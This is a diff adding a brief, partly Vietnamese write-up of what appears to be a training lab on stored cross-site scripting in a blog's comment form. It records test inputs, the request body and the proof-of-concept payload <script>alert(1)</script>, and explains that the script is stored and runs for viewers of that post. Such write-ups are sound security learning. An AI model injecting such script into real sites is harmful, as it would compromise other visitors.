@@ -1,0 +1,10 @@
+This lab contains a stored cross-site scripting vulnerability in the comment functionality.
+
+To solve this lab, submit a comment that calls the alert function when the blog post is viewed.
+
+web có chức năng comment, thử nhập asdf, trả về csrf=euAcWSmq0fx3Q52KDs0PtyHYp7s069E1&postId=6&comment=asdf&name=asdf&email=asdf@asdf&website=, thử nhập <h1>test</h1>, trả về csrf=euAcWSmq0fx3Q52KDs0PtyHYp7s069E1&postId=6&comment=<h1>test</h1>&name=h1&email=h1@h1&website=, rõ ràng nhập vào comment cái gì cũng được, web sẽ hiển thị hết => XSS
+
+Payload: <script>alert(1)</script>
+csrf=euAcWSmq0fx3Q52KDs0PtyHYp7s069E1&postId=6&comment=<script>alert(1)</script>&name=alert&email=a@a&website=
+
+Hàm alert đã được cài vào csdl của web, hàm này chỉ được gọi khi người xem đúng post đã được cài script vào, còn lại web vẫn hoạt động bình thường
